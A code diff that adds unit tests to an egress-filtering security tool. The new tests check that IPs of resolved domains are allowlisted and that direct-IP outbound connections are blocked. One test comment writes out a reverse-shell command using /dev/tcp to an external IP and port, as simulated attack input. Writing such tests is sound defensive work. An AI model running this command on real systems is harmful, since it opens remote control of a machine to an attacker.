@@ -103,9 +103,26 @@ describe('Aegis Egress — Evaluator & Protection Modes', () => {
     assert.ok(result.threat_type.includes('[EXFILTRÉ]'));
   });
 
-  it('should allow legitimate domain', async () => {
+  it('should allow legitimate domain and register its IP in DNS-to-IP allowlist', async () => {
     const evaluator = new EgressEvaluator(mockSystemOne, mockTelemetry, cti, 'tenant-1', true);
     const result = await evaluator.processQuery('google.com');
     assert.strictEqual(result.action, 'ALLOW');
+
+    // Subsequent connection to resolved IP 93.184.216.34 should be allowed within TTL
+    const ipCheck = await evaluator.verifyIpConnection('93.184.216.34', '127.0.0.1', 443);
+    assert.strictEqual(ipCheck.action, 'ALLOW');
+    assert.strictEqual(ipCheck.threat_type, 'CLEAN_EGRESS_DNS_VERIFIED');
+  });
+
+  it('should block direct literal IP outbound connections without prior DNS resolution (Verrou n°1 P0)', async () => {
+    const evaluator = new EgressEvaluator(mockSystemOne, mockTelemetry, cti, 'tenant-1', true);
+    // Simulate /bin/sh -i >& /dev/tcp/185.220.101.99/4444
+    const result = await evaluator.processQuery('185.220.101.99:4444', '10.0.0.15', 'tcp_egress');
+    assert.strictEqual(result.action, 'BLOCK');
+    assert.strictEqual(result.threat_type, 'DIRECT_IP_REVERSE_SHELL_BLOCKED');
+
+    // Internal RFC 1918 traffic should remain allowed
+    const internalResult = await evaluator.verifyIpConnection('172.18.0.5', '172.18.0.2', 5432);
+    assert.strictEqual(internalResult.action, 'ALLOW');
   });
 });
